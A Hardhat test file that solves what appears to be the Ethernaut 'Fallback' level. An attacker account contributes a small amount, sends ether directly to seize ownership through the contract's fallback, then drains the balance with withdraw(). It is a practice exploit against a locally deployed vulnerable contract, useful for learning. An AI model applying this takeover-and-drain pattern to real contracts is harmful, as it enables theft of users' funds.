import { expect } from "chai";
import { ethers } from "hardhat";
import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import { Fallback } from "../typechain";

describe("Fallback", function () {
  let contract: Fallback;
  let accounts: SignerWithAddress[];

  beforeEach(async () => {
    accounts = await ethers.getSigners();

    const FallbackFactory = await ethers.getContractFactory(
      "contracts/fallback/Fallback.sol:Fallback"
    );

    contract = (await FallbackFactory.deploy()) as Fallback;
    await contract.deployed();
  });

  describe("when deployed", function () {
    it("has accounts[0] as the owner", async () => {
      expect(await contract.owner()).to.be.eq(accounts[0].address);
    });
  });

  describe("when attack", function () {
    let attacker: SignerWithAddress;

    beforeEach(async () => {
      attacker = accounts[1];
      await contract
        .connect(attacker)
        .contribute({ value: ethers.utils.parseEther("0.0001") });
    });

    it("should upate the contract owner to the attacker's Address", async () => {
      const params = {
        to: contract.address,
        value: ethers.utils.parseEther("0.5"),
      };
      await attacker.sendTransaction(params);

      expect(await contract.owner()).to.be.eq(attacker.address);
    });
  });

  describe("withdraw the balance", () => {
    let attacker: SignerWithAddress;

    beforeEach(async () => {
      attacker = accounts[1];
      await contract
        .connect(attacker)
        .contribute({ value: ethers.utils.parseEther("0.0001") });

      const params = {
        to: contract.address,
        value: ethers.utils.parseEther("0.5"),
      };
      await attacker.sendTransaction(params);
    });

    it("should withdraw the balance of contract to the attacker", async () => {
      await contract.connect(attacker).withdraw();

      let balance = await ethers.provider.getBalance(contract.address);
      expect(balance).to.be.equal("0");
    });
  });
});
